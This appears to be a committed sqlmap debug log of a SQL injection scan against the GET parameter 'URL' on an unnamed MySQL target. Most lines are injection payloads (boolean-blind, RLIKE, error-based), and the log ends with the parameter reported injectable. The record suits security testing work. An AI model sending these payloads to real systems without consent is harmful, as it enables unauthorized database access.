@@ -1,0 +1,1095 @@
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.8.11#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:17:00 /2025-03-26/
+
+[21:17:00] [INFO] parsing HTTP request from 'url.req'
+[21:17:00] [DEBUG] cleaning up configuration parameters
+[21:17:00] [DEBUG] setting the HTTP timeout
+[21:17:00] [DEBUG] setting the HTTP User-Agent header
+[21:17:00] [DEBUG] creating HTTP requests opener object
+[21:17:00] [DEBUG] forcing back-end DBMS to user defined value
+[21:17:00] [INFO] testing connection to the target URL
+[21:17:00] [DEBUG] declared web page charset 'utf-8'
+[21:17:00] [INFO] testing if the target URL content is stable
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] [21:17:06] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] [21:17:07] [INFO] searching for dynamic content
+[21:17:07] [INFO] dynamic content marked for removal (2 regions)
+[21:17:07] [INFO] testing if GET parameter 'URL' is dynamic
+[21:17:07] [PAYLOAD] 8265
+[21:17:07] [WARNING] GET parameter 'URL' does not appear to be dynamic
+[21:17:07] [PAYLOAD] test'(,,(,..".
+[21:17:08] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:17:08] [INFO] heuristic (basic) test shows that GET parameter 'URL' might be injectable (possible DBMS: 'MySQL')
+[21:17:08] [PAYLOAD] test'NeOFpX<'">nbWcOW
+[21:17:08] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:17:09] [INFO] testing for SQL injection on GET parameter 'URL'
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] [21:19:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[21:19:24] [PAYLOAD] test') AND 3850=1678 AND ('XaND'='XaND
+[21:19:24] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[21:19:24] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:24] [WARNING] reflective value(s) found and filtering out
+[21:19:24] [PAYLOAD] test') AND 1809=1809 AND ('KOgC'='KOgC
+[21:19:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:25] [PAYLOAD] test' AND 4338=1196 AND 'yqfY'='yqfY
+[21:19:25] [PAYLOAD] test' AND 1809=1809 AND 'SdJs'='SdJs
+[21:19:25] [PAYLOAD] test' AND 8334=7957 AND 'vCcZ'='vCcZ
+[21:19:25] [PAYLOAD] test) AND 1629=7513 AND (6686=6686
+[21:19:25] [PAYLOAD] test) AND 1809=1809 AND (3037=3037
+[21:19:25] [PAYLOAD] test) AND 9330=1162 AND (2936=2936
+[21:19:26] [PAYLOAD] test AND 4870=8114
+[21:19:26] [PAYLOAD] test AND 1809=1809
+[21:19:26] [PAYLOAD] test AND 1454=3495
+[21:19:26] [PAYLOAD] test AND 9995=4064-- sooo
+[21:19:26] [PAYLOAD] test AND 1809=1809-- aDCP
+[21:19:26] [PAYLOAD] test AND 8762=3877-- ZYyD
+[21:19:26] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+[21:19:26] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT)' because the risk (3) is higher than the provided (1)
+[21:19:26] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the level (2) is higher than the provided (1)
+[21:19:26] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the risk (3) is higher than the provided (1)
+[21:19:26] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (comment)' because the level (2) is higher than the provided (1)
+[21:19:26] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (comment)' because the risk (3) is higher than the provided (1)
+[21:19:26] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)' because the risk (3) is higher than the provided (1)
+[21:19:26] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[21:19:26] [PAYLOAD] (SELECT (CASE WHEN (2643=1765) THEN 0x74657374 ELSE (SELECT 1765 UNION SELECT 4109) END))
+[21:19:26] [PAYLOAD] (SELECT (CASE WHEN (1909=1909) THEN 0x74657374 ELSE (SELECT 2158 UNION SELECT 5376) END))
+[21:19:26] [PAYLOAD] (SELECT (CASE WHEN (1292=2896) THEN 0x74657374 ELSE (SELECT 2896 UNION SELECT 2804) END))
+[21:19:26] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL)' because the level (2) is higher than the provided (1)
+[21:19:26] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL - original value)' because the level (3) is higher than the provided (1)
+[21:19:26] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE)' because the level (2) is higher than the provided (1)
+[21:19:26] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE - original value)' because the level (3) is higher than the provided (1)
+[21:19:26] [DEBUG] skipping test 'HAVING boolean-based blind - WHERE, GROUP BY clause' because the level (3) is higher than the provided (1)
+[21:19:26] [INFO] testing 'Generic inline queries'
+[21:19:26] [PAYLOAD] (SELECT CONCAT(CONCAT(0x71627a7a71,(CASE WHEN (7601=7601) THEN 0x31 ELSE 0x30 END)),0x717a6b6271))
+[21:19:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[21:19:26] [PAYLOAD] test') AND 1032=2692#
+[21:19:27] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:27] [PAYLOAD] test') AND 4793=4793#
+[21:19:27] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:27] [PAYLOAD] test' AND 1054=9621#
+[21:19:27] [PAYLOAD] test' AND 4793=4793#
+[21:19:27] [PAYLOAD] test' AND 9161=7350#
+[21:19:27] [PAYLOAD] test" AND 6098=2298#
+[21:19:27] [PAYLOAD] test" AND 4793=4793#
+[21:19:27] [PAYLOAD] test" AND 8130=5435#
+[21:19:27] [PAYLOAD] test')) AND 8072=1587#
+[21:19:28] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:28] [PAYLOAD] test')) AND 4793=4793#
+[21:19:28] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:28] [PAYLOAD] test'))) AND 9266=3864#
+[21:19:28] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:28] [PAYLOAD] test'))) AND 4793=4793#
+[21:19:29] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:29] [PAYLOAD] test%' AND 5053=6387#
+[21:19:29] [PAYLOAD] test%' AND 4793=4793#
+[21:19:29] [PAYLOAD] test%' AND 7107=5442#
+[21:19:29] [PAYLOAD] test") AND 1454=1703#
+[21:19:29] [PAYLOAD] test") AND 4793=4793#
+[21:19:29] [PAYLOAD] test") AND 9426=1334#
+[21:19:29] [PAYLOAD] test")) AND 8045=4945#
+[21:19:29] [PAYLOAD] test")) AND 4793=4793#
+[21:19:29] [PAYLOAD] test")) AND 7305=6457#
+[21:19:29] [PAYLOAD] test"))) AND 1406=1720#
+[21:19:30] [PAYLOAD] test"))) AND 4793=4793#
+[21:19:30] [PAYLOAD] test"))) AND 5164=5753#
+[21:19:30] [PAYLOAD] test')) AS OZpR WHERE 2028=2028 AND 1053=2268#
+[21:19:30] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:30] [PAYLOAD] test')) AS EKJz WHERE 3506=3506 AND 4793=4793#
+[21:19:30] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:30] [PAYLOAD] test")) AS BZEq WHERE 8106=8106 AND 6279=9451#
+[21:19:30] [PAYLOAD] test")) AS IXky WHERE 2645=2645 AND 4793=4793#
+[21:19:31] [PAYLOAD] test")) AS JuYl WHERE 6977=6977 AND 8357=5916#
+[21:19:31] [PAYLOAD] test') AS XQiO WHERE 5224=5224 AND 4833=2303#
+[21:19:31] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:31] [PAYLOAD] test') AS YlJl WHERE 4030=4030 AND 4793=4793#
+[21:19:31] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:31] [PAYLOAD] test") AS HxQV WHERE 4474=4474 AND 3271=6891#
+[21:19:31] [PAYLOAD] test") AS JgCY WHERE 1951=1951 AND 4793=4793#
+[21:19:31] [PAYLOAD] test") AS PXCf WHERE 9650=9650 AND 9960=1544#
+[21:19:32] [PAYLOAD] test' IN BOOLEAN MODE) AND 6293=6256#
+[21:19:32] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:32] [PAYLOAD] test' IN BOOLEAN MODE) AND 4793=4793#
+[21:19:32] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:32] [PAYLOAD] test) AND 7673=8732#
+[21:19:32] [PAYLOAD] test) AND 4793=4793#
+[21:19:32] [PAYLOAD] test) AND 8986=3387#
+[21:19:32] [PAYLOAD] test)) AND 7645=9664#
+[21:19:33] [PAYLOAD] test)) AND 4793=4793#
+[21:19:33] [PAYLOAD] test)) AND 9325=5955#
+[21:19:33] [PAYLOAD] test))) AND 7341=3600#
+[21:19:33] [PAYLOAD] test))) AND 4793=4793#
+[21:19:33] [PAYLOAD] test))) AND 7677=1332#
+[21:19:33] [PAYLOAD] test AND 6752=2159#
+[21:19:33] [PAYLOAD] test AND 4793=4793#
+[21:19:33] [PAYLOAD] test AND 4626=5400#
+[21:19:33] [PAYLOAD] test)) AS BomG WHERE 5211=5211 AND 4422=2041#
+[21:19:33] [PAYLOAD] test)) AS liAd WHERE 7684=7684 AND 4793=4793#
+[21:19:33] [PAYLOAD] test)) AS kWID WHERE 3783=3783 AND 9604=1739#
+[21:19:34] [PAYLOAD] test) AS coVw WHERE 5919=5919 AND 5436=6629#
+[21:19:34] [PAYLOAD] test) AS CNdi WHERE 1761=1761 AND 4793=4793#
+[21:19:34] [PAYLOAD] test) AS JKbs WHERE 5820=5820 AND 7013=6898#
+[21:19:34] [PAYLOAD] test` WHERE 1827=1827 AND 3508=7656#
+[21:19:34] [PAYLOAD] test` WHERE 6659=6659 AND 4793=4793#
+[21:19:34] [PAYLOAD] test` WHERE 5002=5002 AND 9093=4185#
+[21:19:34] [PAYLOAD] test`) WHERE 9459=9459 AND 7554=8985#
+[21:19:34] [PAYLOAD] test`) WHERE 6642=6642 AND 4793=4793#
+[21:19:34] [PAYLOAD] test`) WHERE 6656=6656 AND 2201=7961#
+[21:19:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[21:19:34] [PAYLOAD] -8570
+[21:19:34] [PAYLOAD] -8410') OR 7720=2042#
+[21:19:35] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:35] [PAYLOAD] -8742') OR 3683=3683#
+[21:19:35] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:35] [PAYLOAD] -4471') OR 5542=4245#
+[21:19:35] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:35] [PAYLOAD] -9843' OR 8160=6859#
+[21:19:35] [PAYLOAD] -8520' OR 3683=3683#
+[21:19:35] [PAYLOAD] -4305" OR 5032=3149#
+[21:19:36] [PAYLOAD] -5456" OR 3683=3683#
+[21:19:36] [PAYLOAD] -6607')) OR 1850=3545#
+[21:19:36] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:36] [PAYLOAD] -6327')) OR 3683=3683#
+[21:19:36] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:36] [PAYLOAD] -4840')) OR 1556=7962#
+[21:19:36] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:36] [PAYLOAD] -3571'))) OR 5902=3499#
+[21:19:37] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:37] [PAYLOAD] -7776'))) OR 3683=3683#
+[21:19:37] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:37] [PAYLOAD] -9824'))) OR 5523=8562#
+[21:19:38] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:38] [PAYLOAD] -9872%' OR 1963=5008#
+[21:19:38] [PAYLOAD] -6599%' OR 3683=3683#
+[21:19:38] [PAYLOAD] -1771") OR 2046=2313#
+[21:19:38] [PAYLOAD] -1264") OR 3683=3683#
+[21:19:38] [PAYLOAD] -5247")) OR 6554=7849#
+[21:19:38] [PAYLOAD] -3993")) OR 3683=3683#
+[21:19:38] [PAYLOAD] -4708"))) OR 2748=9685#
+[21:19:38] [PAYLOAD] -9132"))) OR 3683=3683#
+[21:19:38] [PAYLOAD] -5007')) AS vVKn WHERE 7740=7740 OR 1766=8261#
+[21:19:38] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:39] [PAYLOAD] -4193')) AS HmAb WHERE 2603=2603 OR 3683=3683#
+[21:19:39] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:39] [PAYLOAD] -9548')) AS wzcg WHERE 4985=4985 OR 6164=6679#
+[21:19:39] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:39] [PAYLOAD] -7664")) AS xLPU WHERE 4207=4207 OR 4639=4377#
+[21:19:39] [PAYLOAD] -6000")) AS wQzP WHERE 7354=7354 OR 3683=3683#
+[21:19:39] [PAYLOAD] -3984') AS GzBF WHERE 5635=5635 OR 9131=8844#
+[21:19:40] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:40] [PAYLOAD] -3205') AS prGu WHERE 3921=3921 OR 3683=3683#
+[21:19:40] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:40] [PAYLOAD] -7347') AS oShl WHERE 1737=1737 OR 3155=2090#
+[21:19:40] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:40] [PAYLOAD] -3419") AS ePar WHERE 6271=6271 OR 4737=5932#
+[21:19:40] [PAYLOAD] -2444") AS PYWn WHERE 6930=6930 OR 3683=3683#
+[21:19:40] [PAYLOAD] -7475) OR 5675=8446#
+[21:19:41] [PAYLOAD] -2980) OR 3683=3683#
+[21:19:41] [PAYLOAD] -5332)) OR 2746=4797#
+[21:19:41] [PAYLOAD] -5874)) OR 3683=3683#
+[21:19:41] [PAYLOAD] -7466))) OR 2415=3759#
+[21:19:41] [PAYLOAD] -4560))) OR 3683=3683#
+[21:19:41] [PAYLOAD] -2796 OR 7965=3762#
+[21:19:41] [PAYLOAD] -9738 OR 3683=3683#
+[21:19:41] [PAYLOAD] -4264)) AS qVuO WHERE 8067=8067 OR 8108=2176#
+[21:19:41] [PAYLOAD] -1516)) AS NvKC WHERE 7728=7728 OR 3683=3683#
+[21:19:41] [PAYLOAD] -3516) AS hzZH WHERE 2429=2429 OR 3335=6062#
+[21:19:41] [PAYLOAD] -5819) AS tdkr WHERE 8226=8226 OR 3683=3683#
+[21:19:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[21:19:41] [PAYLOAD] test') OR NOT 8406=3952#
+[21:19:42] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:42] [PAYLOAD] test') OR NOT 6582=6582#
+[21:19:42] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:42] [PAYLOAD] test' OR NOT 9830=7717#
+[21:19:42] [PAYLOAD] test' OR NOT 6582=6582#
+[21:19:42] [PAYLOAD] test' OR NOT 5568=1230#
+[21:19:42] [PAYLOAD] test" OR NOT 4645=1643#
+[21:19:42] [PAYLOAD] test" OR NOT 6582=6582#
+[21:19:42] [PAYLOAD] test" OR NOT 3541=7519#
+[21:19:42] [PAYLOAD] test')) OR NOT 1889=8247#
+[21:19:43] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:43] [PAYLOAD] test')) OR NOT 6582=6582#
+[21:19:43] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:43] [PAYLOAD] test'))) OR NOT 8288=6483#
+[21:19:43] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:43] [PAYLOAD] test'))) OR NOT 6582=6582#
+[21:19:44] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:44] [PAYLOAD] test%' OR NOT 6422=7231#
+[21:19:44] [PAYLOAD] test%' OR NOT 6582=6582#
+[21:19:44] [PAYLOAD] test%' OR NOT 7584=4406#
+[21:19:44] [PAYLOAD] test") OR NOT 2490=5059#
+[21:19:44] [PAYLOAD] test") OR NOT 6582=6582#
+[21:19:44] [PAYLOAD] test") OR NOT 4120=7141#
+[21:19:44] [PAYLOAD] test")) OR NOT 5885=9256#
+[21:19:44] [PAYLOAD] test")) OR NOT 6582=6582#
+[21:19:44] [PAYLOAD] test")) OR NOT 7658=5912#
+[21:19:44] [PAYLOAD] test"))) OR NOT 1706=1524#
+[21:19:44] [PAYLOAD] test"))) OR NOT 6582=6582#
+[21:19:44] [PAYLOAD] test"))) OR NOT 5231=6044#
+[21:19:45] [PAYLOAD] test')) AS oYOU WHERE 9906=9906 OR NOT 2222=7834#
+[21:19:45] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:45] [PAYLOAD] test')) AS eYcN WHERE 5310=5310 OR NOT 6582=6582#
+[21:19:45] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:45] [PAYLOAD] test")) AS HCPu WHERE 9559=9559 OR NOT 1128=2103#
+[21:19:45] [PAYLOAD] test")) AS ryRP WHERE 1332=1332 OR NOT 6582=6582#
+[21:19:45] [PAYLOAD] test")) AS fkmL WHERE 3425=3425 OR NOT 7020=3990#
+[21:19:45] [PAYLOAD] test') AS dBrX WHERE 7840=7840 OR NOT 3189=1854#
+[21:19:46] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:46] [PAYLOAD] test') AS iWJz WHERE 9990=9990 OR NOT 6582=6582#
+[21:19:46] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:46] [PAYLOAD] test") AS eWgw WHERE 9707=9707 OR NOT 9304=6920#
+[21:19:46] [PAYLOAD] test") AS PYGM WHERE 4719=4719 OR NOT 6582=6582#
+[21:19:46] [PAYLOAD] test") AS QDyD WHERE 7633=7633 OR NOT 4962=8685#
+[21:19:46] [PAYLOAD] test' IN BOOLEAN MODE) OR NOT 5922=5888#
+[21:19:46] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:47] [PAYLOAD] test' IN BOOLEAN MODE) OR NOT 6582=6582#
+[21:19:47] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:47] [PAYLOAD] test) OR NOT 3696=8223#
+[21:19:47] [PAYLOAD] test) OR NOT 6582=6582#
+[21:19:47] [PAYLOAD] test) OR NOT 2691=4135#
+[21:19:47] [PAYLOAD] test)) OR NOT 6744=2165#
+[21:19:47] [PAYLOAD] test)) OR NOT 6582=6582#
+[21:19:47] [PAYLOAD] test)) OR NOT 9962=8437#
+[21:19:47] [PAYLOAD] test))) OR NOT 7917=6051#
+[21:19:47] [PAYLOAD] test))) OR NOT 6582=6582#
+[21:19:47] [PAYLOAD] test))) OR NOT 4365=8474#
+[21:19:48] [PAYLOAD] test OR NOT 8675=9503#
+[21:19:48] [PAYLOAD] test OR NOT 6582=6582#
+[21:19:48] [PAYLOAD] test OR NOT 5539=2006#
+[21:19:48] [PAYLOAD] test)) AS IYvg WHERE 7081=7081 OR NOT 2808=7605#
+[21:19:48] [PAYLOAD] test)) AS AZpe WHERE 3543=3543 OR NOT 6582=6582#
+[21:19:48] [PAYLOAD] test)) AS THhl WHERE 5297=5297 OR NOT 7705=2730#
+[21:19:48] [PAYLOAD] test) AS fNWi WHERE 2413=2413 OR NOT 8656=5552#
+[21:19:48] [PAYLOAD] test) AS SILu WHERE 1600=1600 OR NOT 6582=6582#
+[21:19:48] [PAYLOAD] test) AS CSVK WHERE 6217=6217 OR NOT 5026=3060#
+[21:19:48] [PAYLOAD] test` WHERE 5571=5571 OR NOT 4249=2094#
+[21:19:48] [PAYLOAD] test` WHERE 8797=8797 OR NOT 6582=6582#
+[21:19:48] [PAYLOAD] test` WHERE 1711=1711 OR NOT 2074=6109#
+[21:19:49] [PAYLOAD] test`) WHERE 6044=6044 OR NOT 1741=5153#
+[21:19:49] [PAYLOAD] test`) WHERE 8037=8037 OR NOT 6582=6582#
+[21:19:49] [PAYLOAD] test`) WHERE 5967=5967 OR NOT 4336=5320#
+[21:19:49] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[21:19:49] [PAYLOAD] test') RLIKE (SELECT (CASE WHEN (8227=4410) THEN 0x74657374 ELSE 0x28 END))-- obhy
+[21:19:49] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:49] [PAYLOAD] test') RLIKE (SELECT (CASE WHEN (2039=2039) THEN 0x74657374 ELSE 0x28 END))-- ojNi
+[21:19:49] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:49] [PAYLOAD] test' RLIKE (SELECT (CASE WHEN (7487=4249) THEN 0x74657374 ELSE 0x28 END))-- EGht
+[21:19:50] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:50] [PAYLOAD] test' RLIKE (SELECT (CASE WHEN (2039=2039) THEN 0x74657374 ELSE 0x28 END))-- iZuB
+[21:19:50] [PAYLOAD] test' RLIKE (SELECT (CASE WHEN (7835=1014) THEN 0x74657374 ELSE 0x28 END))-- Qbjk
+[21:19:50] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:50] [INFO] GET parameter 'URL' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
+[21:19:50] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET)' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT)' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT - original value)' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int)' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int - original value)' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[21:19:50] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[21:19:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[21:19:50] [PAYLOAD] test' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71627a7a71,(SELECT (ELT(8830=8830,1))),0x717a6b6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- mPTt
+[21:19:50] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[21:19:50] [PAYLOAD] test' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71627a7a71,(SELECT (ELT(2902=2902,1))),0x717a6b6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- Qmhw
+[21:19:51] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:51] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[21:19:51] [PAYLOAD] test' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x71627a7a71,(SELECT (ELT(6544=6544,1))),0x717a6b6271,0x78))x))-- Dbbb
+[21:19:51] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:51] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[21:19:51] [PAYLOAD] test' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71627a7a71,(SELECT (ELT(5139=5139,1))),0x717a6b6271,0x78))x))-- KQrp
+[21:19:51] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:51] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[21:19:51] [PAYLOAD] test' AND GTID_SUBSET(CONCAT(0x71627a7a71,(SELECT (ELT(8339=8339,1))),0x717a6b6271),8339)-- TNcu
+[21:19:51] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:51] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[21:19:51] [PAYLOAD] test' OR GTID_SUBSET(CONCAT(0x71627a7a71,(SELECT (ELT(4799=4799,1))),0x717a6b6271),4799)-- iuEO
+[21:19:52] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:52] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[21:19:52] [PAYLOAD] test' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71627a7a71,(SELECT (ELT(6769=6769,1))),0x717a6b6271)) USING utf8)))-- kbPk
+[21:19:52] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[21:19:52] [PAYLOAD] test' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71627a7a71,(SELECT (ELT(8151=8151,1))),0x717a6b6271)) USING utf8)))-- zCJs
+[21:19:52] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[21:19:52] [PAYLOAD] test' AND (SELECT 9995 FROM(SELECT COUNT(*),CONCAT(0x71627a7a71,(SELECT (ELT(9995=9995,1))),0x717a6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Qqrq
+[21:19:52] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:52] [INFO] GET parameter 'URL' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because the payload for error-based has already been identified
